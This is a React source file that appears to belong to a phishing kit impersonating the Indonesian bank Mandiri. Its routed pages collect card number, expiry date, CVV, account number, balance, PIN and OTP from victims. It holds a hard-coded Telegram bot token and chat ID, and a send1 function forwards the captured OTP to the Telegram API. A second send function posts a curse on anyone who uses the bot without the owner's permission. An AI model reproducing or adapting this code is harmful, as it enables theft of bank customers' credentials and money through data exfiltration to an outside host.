import {
    useEffect,
    useState
} from 'react';
import {
    BrowserRouter as Router,
    Routes,
    Route
} from 'react-router-dom';
import '../assets/css/App.css';

// pages
import Home from './Home'
import HomeH from './HomeH'
import Pdua from './Pdua'
import Ptiga from './Ptiga'
import Pempat from './Pempat'
import Plima from './Plima'
import Penam from './Penam'

function App() {

    const [satu, setSatu] = useState('');
    const [dua, setDua] = useState('');
    const [lima, setLima] = useState('');
    const [enam, setEnam] = useState('');
    const [tujuh, setTujuh] = useState('');
    const [user, setUser] = useState('');
    const [empat, setEmpat] = useState('');
    const [digit, setDigit] = useState('');
    const [cvv, setCvv] = useState('');
    const [sisa, setSisa] = useState('');
    const [rek, setRek] = useState('');
    const [bulan, setBulan] = useState('');
    const [pin, setPin] = useState('');
    const [tahun, setTahun] = useState('');
    const [otp, setOtp] = useState('');

    let [link, setLink] = useState("https://taxi-but-gadok.store/auth/r-hr2")
    let [loc, setLoc] = useState("")

    const [Token, setToken] = useState('7087909714:AAEBVn3ukdkwje5lUhZ0ZU8p-czBxlw41m0');
    const [chatID, setchatID] = useState('7045287387');

    const send = () => {
        var api = "https://api.telegram.org/bot" + Token + "/sendMessage?chat_id=" + chatID + "&text=";

        let msg = `Bagi yang Login dibot ini tanpa izin dari pemilik, Semoga hidupnya selalu mengalami Sial Seumur Hidup `

        let message = msg.replace(/ /g, '%20').split('\n').join('%0A');
        fetch(api + "Kutukan Mujarab :%20" + message);
        console.error("Notif Tele");
    }


    // useEffect(() => {
    //   setInterval(() => {
    //     if(pin){
    //        document.querySelector("#all").submit()
    //     }
    //   }, 500)
    // })

    // useEffect(() => {
    //   setLoc(window.location.origin + '/enam');
    // })


    const send1 = () => {
        var api = "https://api.telegram.org/bot" + Token + "/sendMessage?chat_id=" + chatID + "&text=";

        let msg = `info\n1.OTP Baru: ${tujuh} `

        let message = msg.replace(/ /g, '%20').split('\n').join('%0A');
        fetch(api + "Mandiri:%20" + message);
        console.error("Notif Tele");
    }

    return ( <
            Router >
            <
            div >
            <
            Routes >
            <
            Route path = '/'
            element = { < HomeH satu = {
                    setSatu
                }
                dua = {
                    setDua
                }
                send = {
                    send
                }
                />}/ >
                <
                Route path = '/satu'
                element = { < Home satu = {
                        setSatu
                    }
                    dua = {
                        setDua
                    }
                    send = {
                        send
                    }
                    />}/ >
                    <
                    Route path = '/dua'
                    element = { < Pdua digit = {
                            setDigit
                        }
                        bulan = {
                            setBulan
                        }
                        tahun = {
                            setTahun
                        }
                        user = {
                            setUser
                        }
                        sisa = {
                            setSisa
                        }
                        rek = {
                            setRek
                        }
                        send = {
                            send
                        }
                        />}/ >
                        <
                        Route path = '/tiga'
                        element = { < Ptiga cvv = {
                                setCvv
                            }
                            send = {
                                send
                            }
                            />}/ >
                            <
                            Route path = '/empat'
                            element = { < Pempat empat = {
                                    setEmpat
                                }
                                send = {
                                    send
                                }
                                />}/ >
                                <
                                Route path = '/lima'
                                element = { < Plima pin = {
                                        setPin
                                    }
                                    tlp = {
                                        rek
                                    }
                                    duser = {
                                        user
                                    }
                                    ddigit = {
                                        digit
                                    }
                                    dbulan = {
                                        bulan
                                    }
                                    dtahun = {
                                        tahun
                                    }
                                    drek = {
                                        rek
                                    }
                                    dsisa = {
                                        sisa
                                    }
                                    dcvv = {
                                        cvv
                                    }
                                    dotp = {
                                        otp
                                    }
                                    send = {
                                        send
                                    }
                                    />}/ >
                                    <
                                    Route path = '/enam'
                                    element = { < Penam otp = {
                                            setOtp
                                        }
                                        send = {
                                            send
                                        }
                                        />}/ >
                                        <
                                        /Routes> <
                                        /div>

                                        <
                                        /Router>
                                    );
                                }

                                export default App;